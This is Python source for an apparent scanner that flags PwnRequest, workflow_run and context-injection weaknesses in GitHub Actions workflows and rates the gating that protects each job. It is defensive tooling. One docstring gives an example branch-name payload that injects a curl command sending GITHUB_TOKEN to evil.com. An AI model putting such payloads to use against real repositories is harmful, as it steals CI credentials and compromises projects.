"""Vulnerability detectors for GitHub Actions workflows."""

import re
from abc import ABC, abstractmethod
from pathlib import Path

import yaml

from actions_scanner.utils.path import extract_org_repo_branch_from_path

from .models import ScanResult, VulnerabilityType, VulnerableJob
from .patterns import (
    ACTOR_GATING_PATTERNS,
    AUTHORIZATION_JOB_PATTERNS,
    DANGEROUS_COMMANDS,
    DANGEROUS_GIT_CHECKOUT_PATTERNS,
    DANGEROUS_REF_PATTERNS,
    DANGEROUS_REPO_PATTERNS,
    MERGED_PR_PATTERNS,
    PERMISSION_CHECK_PATTERNS,
    PERMISSION_OUTPUT_PATTERNS,
    PR_TARGET_INJECTABLE_CONTEXTS,
    SAME_REPO_PATTERNS,
    WORKFLOW_RUN_DANGEROUS_REF_PATTERNS,
    WORKFLOW_RUN_GIT_CHECKOUT_PATTERNS,
    WORKFLOW_RUN_INJECTABLE_CONTEXTS,
    WRITE_ACCESS_PATTERNS,
)


def _has_trigger(workflow: dict, trigger_name: str) -> bool:
    """Check if workflow has a specific trigger."""
    on_section = workflow.get("on") or workflow.get(True)  # 'on' parses as True in YAML
    if on_section is None:
        return False

    if isinstance(on_section, (dict, list)):
        return trigger_name in on_section
    if isinstance(on_section, str):
        return on_section == trigger_name

    return False


def _is_dangerous_command(cmd: str) -> bool:
    """Check if a command is a dangerous build command."""
    if not cmd:
        return False
    cmd_str = str(cmd).strip()
    for line in cmd_str.split("\n"):
        line = line.strip()
        if any(re.search(pattern, line, re.IGNORECASE) for pattern in DANGEROUS_COMMANDS):
            return True
    return False


def _is_local_action(uses_value: str) -> bool:
    """Check if a uses value is a local action (starts with ./)."""
    if not uses_value:
        return False
    return str(uses_value).strip().startswith("./")


def _get_line_number(workflow_content: str, job_name: str, step_index: int) -> int:
    """Estimate line number for a step in a job.

    This is approximate - for precise line numbers,
    use a YAML parser that tracks positions.
    """
    lines = workflow_content.split("\n")
    in_job = False
    in_steps = False
    step_count = -1

    for i, line in enumerate(lines, 1):
        stripped = line.strip()

        if re.match(rf"^\s*{re.escape(job_name)}:\s*$", line) or re.match(
            rf"^\s*{re.escape(job_name)}:\s*#", line
        ):
            in_job = True
            continue

        if in_job:
            if (
                re.match(r"^\s{2}[a-zA-Z_-]+:\s*$", line)
                and not stripped.startswith("-")
                and "steps:" not in stripped
                and ":" in stripped
            ):
                indent = len(line) - len(line.lstrip())
                if indent <= 2:
                    break

            if "steps:" in stripped:
                in_steps = True
                continue

            if in_steps and re.match(r"^\s*-\s+", line):
                step_count += 1
                if step_count == step_index:
                    return i

    return 0


class BaseDetector(ABC):
    """Base class for vulnerability detectors with shared functionality."""

    @abstractmethod
    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for vulnerabilities."""
        ...

    def scan_directory(self, directory: Path) -> ScanResult:
        """Scan a directory for vulnerable workflows.

        Only scans .github/workflows at the repository root, not in subdirectories.
        """
        result = ScanResult()

        workflows_dir = directory / ".github" / "workflows"
        if not workflows_dir.is_dir():
            return result

        for yaml_file in workflows_dir.iterdir():
            if not yaml_file.is_file():
                continue
            if yaml_file.suffix not in (".yml", ".yaml"):
                continue
            try:
                vulns = self.analyze_workflow(yaml_file)
                result.vulnerabilities.extend(vulns)
                result.files_scanned += 1
            except Exception as e:
                result.errors.append(f"{yaml_file}: {e}")

        return result

    def _is_positive_label_gate(self, if_condition: str) -> bool:
        """Check if an if condition is a POSITIVE label gate (requires label to run).

        Positive: contains(...labels..., 'foo') without negation -> requires label
        Negative: !contains(...labels..., 'foo') -> skips if label present (NOT a gate!)
        """
        if not if_condition:
            return False

        # Check for explicit "labeled" action requirement
        if re.search(r"github\.event\.action\s*==\s*['\"]labeled['\"]", if_condition):
            return True

        # Check for contains() on labels
        contains_match = re.search(
            r"contains\s*\(\s*github\.event\.pull_request\.labels", if_condition
        )
        if contains_match:
            # Check if this contains() is negated
            before_contains = if_condition[: contains_match.start()]
            # Negated contains = skip if label present = NOT a gate
            # Non-negated contains = require label = IS a gate
            return not (
                re.search(r"!\s*$", before_contains)
                or re.search(r"\bnot\s*$", before_contains, re.IGNORECASE)
            )

        return False

    def _check_job_label_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job or its dependencies require a specific label to run."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        if self._is_positive_label_gate(if_condition):
            return True, f"Job requires label: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                if self._is_positive_label_gate(dep_if):
                    return True, f"Dependency '{need}' requires label: {dep_if[:60]}"

        return False, ""

    def _check_job_same_repo_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job only runs for PRs from the same repo (not forks)."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        for pattern in SAME_REPO_PATTERNS:
            if re.search(pattern, if_condition, re.IGNORECASE):
                return True, f"Job only runs for same-repo PRs: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                for pattern in SAME_REPO_PATTERNS:
                    if re.search(pattern, dep_if, re.IGNORECASE):
                        return True, f"Dependency '{need}' only runs for same-repo PRs"

        return False, ""

    def _check_job_permission_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job is gated by a collaborator permission check.

        This requires:
        1. The job's if condition checks a permission-related output from a dependency
        2. That dependency actually calls getCollaboratorPermissionLevel
        3. That dependency checks for write/admin/maintain access
        """
        jobs = workflow.get("jobs", {})
        if_condition = str(job.get("if", ""))

        referenced_jobs = set()
        for pattern in PERMISSION_OUTPUT_PATTERNS:
            for match in re.finditer(pattern, if_condition):
                if match.groups():
                    referenced_jobs.add(match.group(1))

        if not referenced_jobs:
            return False, ""

        for ref_job_name in referenced_jobs:
            dep_job = jobs.get(ref_job_name, {})
            if not isinstance(dep_job, dict):
                continue

            steps = dep_job.get("steps", [])
            if not isinstance(steps, list):
                continue

            for step in steps:
                if not isinstance(step, dict):
                    continue

                uses = step.get("uses", "")
                if "github-script" not in str(uses):
                    continue

                with_block = step.get("with", {})
                script = str(with_block.get("script", ""))

                has_perm_check = any(
                    re.search(pattern, script) for pattern in PERMISSION_CHECK_PATTERNS
                )
                has_write_check = any(
                    re.search(pattern, script, re.IGNORECASE) for pattern in WRITE_ACCESS_PATTERNS
                )

                if has_perm_check and has_write_check:
                    return (
                        True,
                        f"Job '{ref_job_name}' verifies collaborator has write/admin/maintain access",
                    )

        return False, ""

    def _check_job_actor_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job only runs for specific bot actors."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        for pattern in ACTOR_GATING_PATTERNS:
            if re.search(pattern, if_condition, re.IGNORECASE):
                return True, f"Job only runs for bot actor: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                for pattern in ACTOR_GATING_PATTERNS:
                    if re.search(pattern, dep_if, re.IGNORECASE):
                        return True, f"Dependency '{need}' only runs for bot actor"

        return False, ""

    def _check_job_merged_pr_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job only runs after a PR is merged."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        for pattern in MERGED_PR_PATTERNS:
            if re.search(pattern, if_condition, re.IGNORECASE):
                return True, f"Job only runs on merged PRs: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                for pattern in MERGED_PR_PATTERNS:
                    if re.search(pattern, dep_if, re.IGNORECASE):
                        return True, f"Dependency '{need}' only runs on merged PRs"

        return False, ""

    def _analyze_protection(self, workflow: dict, job_name: str) -> tuple[str, str]:
        """Determine what protection (if any) a vulnerable job has.

        Returns (protection_type, detail).

        Protection types:
        - "none": Fully exploitable by any PR author
        - "label": Requires maintainer to add label (social engineering vector)
        - "permission": Requires PR author to have write/admin/maintain access
        - "same_repo": Only runs for PRs from same repo, not forks
        - "actor": Only runs for specific bot actors
        - "merged": Only runs on merged PRs (code already reviewed)
        """
        jobs = workflow.get("jobs", {})
        job = jobs.get(job_name, {})

        # Check for permission gating (strongest protection)
        is_perm_gated, perm_reason = self._check_job_permission_gating(job, workflow)
        if is_perm_gated:
            return "permission", perm_reason

        # Check for actor gating
        is_actor_gated, actor_reason = self._check_job_actor_gating(job, workflow)
        if is_actor_gated:
            return "actor", actor_reason

        # Check for merged PR gating
        is_merged_gated, merged_reason = self._check_job_merged_pr_gating(job, workflow)
        if is_merged_gated:
            return "merged", merged_reason

        # Check for both same-repo and label gating
        is_same_repo, same_repo_reason = self._check_job_same_repo_gating(job, workflow)
        is_label_gated, label_reason = self._check_job_label_gating(job, workflow)

        # If both same-repo AND label checks exist in an OR condition,
        # the protection is only as strong as the weaker one (label-gated)
        if is_same_repo and is_label_gated:
            if_condition = str(job.get("if", ""))
            needs = job.get("needs", [])
            if isinstance(needs, str):
                needs = [needs]
            for need in needs:
                dep_job = jobs.get(need, {})
                if isinstance(dep_job, dict):
                    if_condition += " " + str(dep_job.get("if", ""))

            if "||" in if_condition:
                return "label", f"OR condition: {label_reason}"

        if is_same_repo:
            return "same_repo", same_repo_reason

        if is_label_gated:
            return "label", label_reason

        return "none", ""


class PwnRequestDetector(BaseDetector):
    """Detects PwnRequest vulnerabilities in GitHub Actions workflows.

    A PwnRequest vulnerability requires three conditions in the same job:
    1. pull_request_target trigger
    2. Checkout of untrusted PR code (head.ref, head.sha, merge_commit_sha)
    3. Execution of code from the checkout (npm, make, local actions, etc.)
    """

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for PwnRequest vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        if not _has_trigger(workflow, "pull_request_target"):
            return []

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            checkout_result = self._find_dangerous_checkout(steps)
            if not checkout_result:
                continue

            checkout_index, checkout_ref = checkout_result

            exec_result = self._find_dangerous_exec(steps, checkout_index)
            if not exec_result:
                continue

            exec_index, exec_type, exec_value = exec_result

            checkout_line = _get_line_number(content, job_name, checkout_index)
            exec_line = _get_line_number(content, job_name, exec_index)
            has_auth = self._has_authorization_job(workflow, job_name)
            protection, protection_detail = self._analyze_protection(workflow, job_name)
            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

            vulnerabilities.append(
                VulnerableJob(
                    workflow_path=workflow_path,
                    job_name=job_name,
                    checkout_line=checkout_line,
                    checkout_ref=checkout_ref,
                    exec_line=exec_line,
                    exec_type=exec_type,
                    exec_value=exec_value,
                    has_authorization=has_auth,
                    branch=branch,
                    protection=protection,
                    protection_detail=protection_detail,
                )
            )

        return vulnerabilities

    def _is_dangerous_ref(self, ref_value: str) -> bool:
        """Check if a ref value contains dangerous PR references."""
        if not ref_value:
            return False
        ref_str = str(ref_value)
        return any(re.search(pattern, ref_str) for pattern in DANGEROUS_REF_PATTERNS)

    def _find_dangerous_checkout(self, steps: list) -> tuple[int, str] | None:
        """Find a dangerous checkout step in a list of steps.

        Returns (step_index, ref_value) or None.
        Checks both actions/checkout refs and git commands that checkout PR code.
        """
        for i, step in enumerate(steps):
            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if uses and "actions/checkout" in str(uses):
                with_block = step.get("with", {})
                if isinstance(with_block, dict):
                    ref = with_block.get("ref", "")
                    if self._is_dangerous_ref(ref):
                        return (i, str(ref))

                    repo_value = with_block.get("repository", "")
                    if repo_value:
                        repo_str = str(repo_value)
                        if any(re.search(pattern, repo_str) for pattern in DANGEROUS_REPO_PATTERNS):
                            return (i, f"repository={repo_str}")

            run = step.get("run", "")
            if run:
                run_str = str(run)
                for pattern in DANGEROUS_GIT_CHECKOUT_PATTERNS:
                    if re.search(pattern, run_str, re.IGNORECASE):
                        return (i, "git checkout PR code")

        return None

    def _find_dangerous_exec(self, steps: list, checkout_index: int) -> tuple[int, str, str] | None:
        """Find a dangerous exec step after the checkout.

        Returns (step_index, exec_type, exec_value) or None.
        """
        for i, step in enumerate(steps):
            if i <= checkout_index:
                continue

            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if _is_local_action(uses):
                return (i, "local_action", str(uses))

            run = step.get("run", "")
            if _is_dangerous_command(run):
                cmd_str = str(run).strip()
                first_line = cmd_str.split("\n")[0].strip()[:50]
                return (i, "build_command", first_line)

        return None

    def _has_authorization_job(self, workflow: dict, job_name: str) -> bool:
        """Check if a job has an authorization dependency (needs: authorize or similar)."""
        jobs = workflow.get("jobs", {})
        job = jobs.get(job_name, {})
        needs = job.get("needs", [])

        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            need_lower = str(need).lower()
            if any(pattern in need_lower for pattern in AUTHORIZATION_JOB_PATTERNS):
                return True

        return False


class WorkflowRunDetector(BaseDetector):
    """Detects workflow_run vulnerabilities in GitHub Actions workflows.

    A workflow_run vulnerability requires three conditions in the same job:
    1. workflow_run trigger
    2. Checkout of PR code from the triggering workflow
    3. Execution of code from the checkout (npm, make, local actions, etc.)
    """

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for workflow_run vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        if not _has_trigger(workflow, "workflow_run"):
            return []

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            checkout_result = self._find_dangerous_checkout(steps)
            if not checkout_result:
                continue

            checkout_index, checkout_ref = checkout_result

            exec_result = self._find_dangerous_exec(steps, checkout_index)
            if not exec_result:
                continue

            exec_index, exec_type, exec_value = exec_result

            checkout_line = _get_line_number(content, job_name, checkout_index)
            exec_line = _get_line_number(content, job_name, exec_index)
            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

            protection, protection_detail = self._analyze_protection(workflow, job_name)

            vulnerabilities.append(
                VulnerableJob(
                    workflow_path=workflow_path,
                    job_name=job_name,
                    checkout_line=checkout_line,
                    checkout_ref=checkout_ref,
                    exec_line=exec_line,
                    exec_type=exec_type,
                    exec_value=exec_value,
                    has_authorization=False,
                    branch=branch,
                    protection=protection,
                    protection_detail=protection_detail,
                    vulnerability_type=VulnerabilityType.WORKFLOW_RUN.value,
                )
            )

        return vulnerabilities

    def _is_dangerous_workflow_run_ref(self, ref_value: str) -> bool:
        """Check if a ref value contains dangerous workflow_run references."""
        if not ref_value:
            return False
        ref_str = str(ref_value)
        return any(re.search(pattern, ref_str) for pattern in WORKFLOW_RUN_DANGEROUS_REF_PATTERNS)

    def _find_dangerous_checkout(self, steps: list) -> tuple[int, str] | None:
        """Find a dangerous checkout step in a list of steps.

        Returns (step_index, ref_value) or None.
        """
        for i, step in enumerate(steps):
            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if uses and "actions/checkout" in str(uses):
                with_block = step.get("with", {})
                if isinstance(with_block, dict):
                    ref = with_block.get("ref", "")
                    if self._is_dangerous_workflow_run_ref(ref):
                        return (i, str(ref))

            run = step.get("run", "")
            if run:
                run_str = str(run)
                for pattern in WORKFLOW_RUN_GIT_CHECKOUT_PATTERNS:
                    if re.search(pattern, run_str, re.IGNORECASE):
                        return (i, "git checkout workflow_run code")

        return None

    def _find_dangerous_exec(self, steps: list, checkout_index: int) -> tuple[int, str, str] | None:
        """Find a dangerous exec step after the checkout.

        Returns (step_index, exec_type, exec_value) or None.
        """
        for i, step in enumerate(steps):
            if i <= checkout_index:
                continue

            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if _is_local_action(uses):
                return (i, "local_action", str(uses))

            run = step.get("run", "")
            if _is_dangerous_command(run):
                cmd_str = str(run).strip()
                first_line = cmd_str.split("\n")[0].strip()[:50]
                return (i, "build_command", first_line)

        return None


class ContextInjectionDetector(BaseDetector):
    """Detects context injection vulnerabilities in GitHub Actions workflows.

    A context injection vulnerability occurs when:
    1. A dangerous trigger (pull_request_target or workflow_run)
    2. Attacker-controlled context variables are interpolated into run: blocks
    3. NO checkout is required - the injection happens via ${{ }} expressions

    Example vulnerable pattern:
        on: pull_request_target
        jobs:
          build:
            steps:
              - run: echo "Branch: ${{ github.head_ref }}"

    An attacker can create a branch named: "; curl evil.com?t=$GITHUB_TOKEN #"
    to achieve command injection.
    """

    def __init__(self) -> None:
        pr_target_combined = "|".join(PR_TARGET_INJECTABLE_CONTEXTS)
        workflow_run_combined = "|".join(WORKFLOW_RUN_INJECTABLE_CONTEXTS)

        self._pr_target_pattern = re.compile(
            rf"\$\{{\{{\s*({pr_target_combined})\s*\}}\}}", re.IGNORECASE
        )
        self._workflow_run_pattern = re.compile(
            rf"\$\{{\{{\s*({workflow_run_combined})\s*\}}\}}", re.IGNORECASE
        )

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for context injection vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        has_pr_target = _has_trigger(workflow, "pull_request_target")
        has_workflow_run = _has_trigger(workflow, "workflow_run")

        if not has_pr_target and not has_workflow_run:
            return []

        pattern = self._pr_target_pattern if has_pr_target else self._workflow_run_pattern

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            for step_index, step in enumerate(steps):
                if not isinstance(step, dict):
                    continue

                run_block = step.get("run", "")
                if not run_block:
                    continue

                run_str = str(run_block)

                matches = pattern.findall(run_str)
                if matches:
                    line_number = _get_line_number(content, job_name, step_index)
                    protection, protection_detail = self._analyze_protection(workflow, job_name)
                    _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

                    dangerous_expr = f"${{{{ {matches[0]} }}}}"

                    vulnerabilities.append(
                        VulnerableJob(
                            workflow_path=workflow_path,
                            job_name=job_name,
                            checkout_line=0,
                            checkout_ref=dangerous_expr,
                            exec_line=line_number,
                            exec_type="context_injection",
                            exec_value=run_str[:80],
                            has_authorization=False,
                            branch=branch,
                            protection=protection,
                            protection_detail=protection_detail,
                            vulnerability_type=VulnerabilityType.CONTEXT_INJECTION.value,
                        )
                    )

        return vulnerabilities


# Convenience functions for standalone usage
def analyze_workflow(workflow_path: Path) -> list[VulnerableJob]:
    """Analyze a workflow file for PwnRequest vulnerabilities."""
    detector = PwnRequestDetector()
    return detector.analyze_workflow(workflow_path)


def analyze_workflow_all(workflow_path: Path) -> list[VulnerableJob]:
    """Analyze a workflow file for all vulnerability types."""
    results = []
    pwn_detector = PwnRequestDetector()
    workflow_run_detector = WorkflowRunDetector()
    context_injection_detector = ContextInjectionDetector()
    results.extend(pwn_detector.analyze_workflow(workflow_path))
    results.extend(workflow_run_detector.analyze_workflow(workflow_path))
    results.extend(context_injection_detector.analyze_workflow(workflow_path))
    return results


def scan_directory(directory: Path) -> ScanResult:
    """Scan a directory for all vulnerable workflows."""
    pwn_detector = PwnRequestDetector()
    workflow_run_detector = WorkflowRunDetector()
    context_injection_detector = ContextInjectionDetector()
    result = ScanResult()

    workflows_dir = directory / ".github" / "workflows"
    if not workflows_dir.is_dir():
        return result

    for yaml_file in workflows_dir.iterdir():
        if not yaml_file.is_file():
            continue
        if yaml_file.suffix not in (".yml", ".yaml"):
            continue
        try:
            # Run all detectors
            pwn_vulns = pwn_detector.analyze_workflow(yaml_file)
            workflow_run_vulns = workflow_run_detector.analyze_workflow(yaml_file)
            context_injection_vulns = context_injection_detector.analyze_workflow(yaml_file)
            result.vulnerabilities.extend(pwn_vulns)
            result.vulnerabilities.extend(workflow_run_vulns)
            result.vulnerabilities.extend(context_injection_vulns)
            result.files_scanned += 1
        except Exception as e:
            result.errors.append(f"{yaml_file}: {e}")

    return result
